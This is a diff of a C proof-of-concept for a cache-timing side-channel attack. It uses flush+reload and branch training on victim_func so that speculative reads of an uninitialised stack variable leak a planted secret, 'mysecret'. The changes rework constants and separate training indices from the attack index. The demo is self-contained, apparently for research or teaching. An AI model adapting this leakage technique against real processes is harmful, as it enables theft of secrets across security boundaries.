@@ -5,33 +5,36 @@
 #include "../lib/time_and_flush.c"
 #include "../lib/print_results.c"
 
-#define N_PAGES 256
-#define REPETITIONS 10000
-#define CACHE_HIT 100
+#define CACHE_HIT   100
+#define CL_SIZE     64          //CACHE LINE SIZE
+#define PAGE_SIZE   4096
+#define N_PAGES     256
+
+#define REPETITIONS 1000
+#define N_TRAINING  10
 #define SECRET_SIZE 9
-#define N_TRAINING 10
-#define SECRET "mysecret"
-#define false 0
-#define true  1
-#define DBG false
-#define CL_SIZE 64      //CACHE LINE SIZE
-#define CP_SIZE 4096    //CACHE PAGE SIZE
+#define SECRET      "mysecret"
+
+#define false       0
+#define true        1
+#define DBG         false
+
 
 cp_t* flush_reload_arr;
 volatile cp_t cp;   //cache page declared out of function to keep stack of uninit_func() identical to init_func()
 
 void touch_secret(int secret_index) {
-    volatile char __attribute__ ((aligned (CP_SIZE))) s = SECRET[secret_index];
+    volatile char __attribute__ ((aligned (PAGE_SIZE))) s = SECRET[secret_index];
     if(DBG)printf("secret\t%p:\t%d\n", &s, s);
 }
 
 void init_func(int val) {
-    volatile char __attribute__ ((aligned (CP_SIZE))) init = val;
+    volatile char __attribute__ ((aligned (PAGE_SIZE))) init = val;
     if(DBG)printf("init  \t%p:\t%d\n", &init, init);
 }
 
 void uninit_func() {
-    volatile char __attribute__ ((aligned (CP_SIZE))) uninit;
+    volatile char __attribute__ ((aligned (PAGE_SIZE))) uninit;
     cp = flush_reload_arr[uninit];
     if(DBG)printf("uninit\t%p:\t%d\n", &uninit, uninit);
 }
@@ -42,7 +45,7 @@ void uninit_func() {
  * Variables required in mem:
  *  init_bool_copy
  *
- * Training: init_bool=false    secret_index={iterate through SECRET}
+ * Training: init_bool=false    secret_index=0
  * Attack:   init_bool=true     secret_index={iterate through SECRET}
  */
 void victim_func(char init_bool, int secret_index) {
@@ -64,13 +67,18 @@ int* prepare(int secret_index) {
     flush_arr(flush_reload_arr, N_PAGES);
     cpuid();
 
-    int n_accesses = N_TRAINING + 1;
-    char init_bools[n_accesses];
-    for(int i = 0; i < n_accesses; i++) init_bools[i] = false;
-    init_bools[n_accesses-1] = true;
+    int n_accesses =    N_TRAINING + 1;
+    char init_bools    [n_accesses];
+    char secret_indices[n_accesses];
+    for(int i = 0;  i < n_accesses; i++) {
+        init_bools     [i] = false;
+        secret_indices [i] = 0;
+    }
+    init_bools         [n_accesses-1] = true;
+    secret_indices     [n_accesses-1] = secret_index;
 
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(init_bools[i], secret_index);
+        victim_func(init_bools[i], secret_indices[i]);
         cpuid();
         if(i < n_accesses-1) {
             cpuid();
